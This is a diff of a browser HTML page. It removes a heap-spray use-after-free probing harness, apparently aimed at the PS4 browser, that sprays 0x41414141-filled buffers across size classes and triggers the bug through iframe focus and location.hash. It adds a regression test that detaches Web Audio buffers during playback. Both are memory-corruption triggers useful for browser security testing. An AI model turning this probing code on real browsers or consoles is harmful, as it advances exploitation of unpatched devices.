@@ -1,151 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Teste de Regress�o: Detach de AudioBuffer durante renderFromBuffer</title>
+</head>
+<body>
+<div id="status">Executando teste...</div>
 
-<style>
-  iframe { content: url(); zoom: 0.01; }
-  #out {
-    position: fixed; top: 0; right: 0;
-    width: 280px; height: 180px;
-    background: #000; color: #0f0;
-    font: 10px monospace;
-    overflow: hidden; padding: 4px;
-    z-index: 9999;
-  }
-</style>
-<div id="out">aguardando...</div>
 <script>
-  // ── Saída visível na tela — PS4 não tem console acessível ─────────────
-  let ciclo = 0;
-  const out = document.getElementById('out');
-  function log(msg) {
-    out.textContent = '[' + ciclo + '] ' + msg + '\n'
-                    + out.textContent.slice(0, 800);
-  }
-
-  const MAX_CICLOS  = 150;
-  const SIZE_CLASSES = [0x100, 0x140, 0x180, 0x1c0, 0x200, 0x240, 0x280];
-  let _spray    = null;
-  const anomalias = [];
-
-  // ── Spray ─────────────────────────────────────────────────────────────
-  function fazerSpray(sz) {
-    try {
-      _spray = null;
-      const buf = [];
-      for (let i = 0; i < 512; i++) {
-        const ab = new ArrayBuffer(sz);
-        new Uint32Array(ab).fill(0x41414141);
-        buf.push(ab);
-      }
-      _spray = buf;
-    } catch(e) { log('ERR spray: ' + e.message); }
-  }
-
-  // ── Detecção de anomalia ───────────────────────────────────────────────
-  function checar(tag, sz) {
-    try {
-      const r = i0.getBoundingClientRect();
-      if (r.width === 0 && r.height === 0) {
-        anomalias.push({ ciclo, sz, tag, e: 'geom-zero' });
-        log('! ' + tag + ' geom-zero sz=0x' + sz.toString(16));
-      }
-    } catch(e) {
-      anomalias.push({ ciclo, sz, tag, e: e.message });
-      log('! ' + tag + ' ERR: ' + e.message);
+// Fun��o utilit�ria de GC via aloca��o recursiva de mem�ria
+function gc() {
+    function gcRec(n) {
+        if (n < 1)
+            return {};
+        var temp = { i: "ab" + i + (i / 100000) };
+        temp += "foo";
+        gcRec(n - 1);
     }
-  }
+    for (var i = 0; i < 1000; i++)
+        gcRec(10);
+}
 
-  // ── Estratégias ────────────────────────────────────────────────────────
-  const EST = [
-    { label: 'A-baseline',
-      fn: () => {} },
-
-    { label: 'B-layout-thrash',
-      fn: () => { try {
-        for (let i = 0; i < 8; i++) {
-          i0.style.outline = i + 'px solid red';
-          void i0.offsetWidth;
-        }
-        i0.style.outline = '';
-      } catch(e) { log('ERR B: ' + e.message); } } },
-
-    { label: 'C-zoom-cycle',
-      fn: () => { try {
-        i0.style.zoom = '0.02'; void i0.offsetWidth;
-        i0.style.zoom = '0.01'; void i0.offsetWidth;
-      } catch(e) { log('ERR C: ' + e.message); } } },
-
-    { label: 'D-content-cycle',
-      fn: () => { try {
-        i0.style.content = 'url(about:blank)'; void i0.offsetWidth;
-        i0.style.content = 'url()';            void i0.offsetWidth;
-      } catch(e) { log('ERR D: ' + e.message); } } },
-
-    { label: 'E-gc-pressure',
-      fn: () => { try {
-        const tmp = [];
-        for (let i = 0; i < 30; i++) tmp.push(new ArrayBuffer(1024 * 1024));
-      } catch(e) { log('ERR E: ' + e.message); } } },
-
-    { label: 'F-post-layout',
-      fn: () => { try {
-        void i0.offsetWidth;
-        void i0.getBoundingClientRect();
-        void i0.offsetWidth;
-      } catch(e) { log('ERR F: ' + e.message); } } },
-  ];
-
-  // ── Relatório final ───────────────────────────────────────────────────
-  function relatorio() {
-    log('FIM: ' + ciclo + ' ciclos | ' + anomalias.length + ' anomalias');
-    if (anomalias.length > 0) {
-      const freq = {};
-      anomalias.forEach(a => { freq[a.sz] = (freq[a.sz] || 0) + 1; });
-      const top = Object.entries(freq).sort((a, b) => b[1] - a[1])[0];
-      log('CANDIDATA: 0x' + parseInt(top[0]).toString(16)
-          + ' (' + top[1] + 'x)');
-    } else {
-      log('sem anomalia JS');
-      log('UAF ocorre em C++ puro');
-    }
-  }
-
-  // ── Loop original — intacto ──────────────────────────────────────────
-  onload = () => {
-    log('onload ok');
-    document.documentElement.append(document.createElement('frameset'));
-
-    i0.onfocus = () => {
-      // PRIMEIRO LOG — antes de qualquer outro código
-      log('onfocus');
-
-      if (ciclo >= MAX_CICLOS) {
-        i0.onfocus = null;
-        relatorio();
+async function runWebAudioDetachTest() {
+    if (!window.AudioContext) {
+        document.getElementById("status").innerText = "PASS: Web Audio n�o suportado.";
         return;
-      }
+    }
 
-      const sz  = SIZE_CLASSES[ciclo % SIZE_CLASSES.length];
-      const est = EST[ciclo % EST.length];
+    const ctx = new AudioContext();
 
-      if (ciclo % 10 === 0)
-        log(est.label + ' sz=0x' + sz.toString(16));
+    // Worker dummy para receber os buffers transferidos
+    const blob = new Blob([`
+        self.onmessage = function(e) {
+            // Buffer recebido e descartado
+        };
+    `], { type: "application/javascript" });
+    const worker = new Worker(URL.createObjectURL(blob));
 
-      fazerSpray(sz);
-      est.fn();
-      checar('pre', sz);
+    for (let cycle = 0; cycle < 100; cycle++) {
+        // 1. Cria um AudioBuffer com dados v�lidos
+        const buffer = ctx.createBuffer(2, 4096, ctx.sampleRate);
+        const channelData0 = buffer.getChannelData(0);
+        const channelData1 = buffer.getChannelData(1);
 
-      location.hash = 'y';   // ← intacto
+        for (let i = 0; i < 4096; i++) {
+            channelData0[i] = Math.sin(i * 0.05);
+            channelData1[i] = Math.cos(i * 0.05);
+        }
 
-      fazerSpray(sz);
-      checar('post', sz);
+        // 2. Conecta ao AudioBufferSourceNode e inicia a renderiza��o na thread de �udio
+        const source = ctx.createBufferSource();
+        source.buffer = buffer;
+        source.connect(ctx.destination);
+        source.start();
 
-      ciclo++;
-    };
+        // 3. Tenta desanexar (transfer) o buffer na main thread enquanto o �udio roda
+        // Sem o patch, a transfer�ncia ocorria com sucesso e causava UAF na thread de �udio
+        try {
+            worker.postMessage({ buf: channelData0.buffer }, [channelData0.buffer]);
+        } catch (e) {
+            // Com o patch, o buffer est� marcado como non-detachable, lan�ando erro de clone esperado
+        }
 
-    location.hash = 'x';   // ← intacto
+        try {
+            worker.postMessage({ buf: channelData1.buffer }, [channelData1.buffer]);
+        } catch (e) {
+            // Esperado com o patch
+        }
 
-    let s0 = document.createElement('script');
-    s0.src = `data:text/javascript,caches.has('a').then(() => i0.focus());`;
-    document.head.append(s0);
-  };
+        source.stop();
+        source.disconnect();
+
+        if (cycle % 10 === 0) {
+            gc();
+        }
+    }
+
+    await ctx.close();
+    worker.terminate();
+
+    document.getElementById("status").innerText = "PASS: Tentativas de detach em AudioBuffer em execu��o tratadas sem UAF.";
+}
+
+runWebAudioDetachTest().catch((err) => {
+    document.getElementById("status").innerText = "FAIL: " + err.message;
+});
 </script>
-<iframe id="i0"></iframe>
+</body>
+</html>
